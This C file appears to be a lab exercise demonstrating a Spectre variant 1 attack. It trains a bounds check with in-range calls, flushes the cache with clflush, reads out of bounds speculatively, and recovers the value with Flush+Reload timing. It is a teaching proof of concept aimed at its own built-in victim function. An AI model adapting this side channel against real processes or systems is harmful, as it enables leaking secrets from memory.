#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

#define CACHE_HIT_THRESHOLD 200 // Adjusted based on your cycle counts (84–131)

typedef struct datablock {
    uint8_t lpad[508];
    uint8_t rpad[508];
    uint8_t dat;
  // uint8_t rpad[508];
} DataBlock;

int size = 10;
DataBlock array[256];
uint8_t temp;

void flushSideChannel() {
    for (int i = 0; i < 256; i++) {
        array[i].dat = 1; // Initialize to avoid copy-on-write
        _mm_clflush(&array[i].dat); // Flush immediately after setting
    }
}

int reloadSideChannel() {
    uint64_t start, end;
    int junk = 0;
    volatile uint8_t *addr;
    int guessed_secret = -1;
    uint64_t min_time = UINT64_MAX;

    for (int i = 0; i < 256; i++) {
        addr = &array[i].dat;
        start = __rdtscp(&junk);
        junk = *addr;
        end = __rdtscp(&junk);
        uint64_t delta = end - start;
        printf("Index %d: %lu cycles\n", i, delta); // Debug output
        if (delta <= CACHE_HIT_THRESHOLD && delta < min_time) {
            min_time = delta;
            guessed_secret = i;
        }
    }
    return guessed_secret;
}

void victim(size_t x) {
    if (x < size) {
        temp = array[x].dat;
    }
}

int main() {
    flushSideChannel();

    // EXHIBIT A.1 BEGIN
    for (int i = 0; i < 10; i++) {
        _mm_clflush(&size); // EXHIBIT B
        _mm_mfence();       // Ensure flush completes
        victim(i);          // EXHIBIT D
    }
    // EXHIBIT A.1 END

    _mm_clflush(&size); // EXHIBIT B
    _mm_mfence();       // Ensure flush completes
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&array[i].dat); // EXHIBIT C
    }
    _mm_mfence();       // Ensure all flushes complete
    victim(97);         // EXHIBIT A.2
    victim(97);         // EXHIBIT A.2
    victim(97);         // EXHIBIT A.2

    int secret = reloadSideChannel();
    printf("The secret is %d.\n", secret);

    return 0;
}
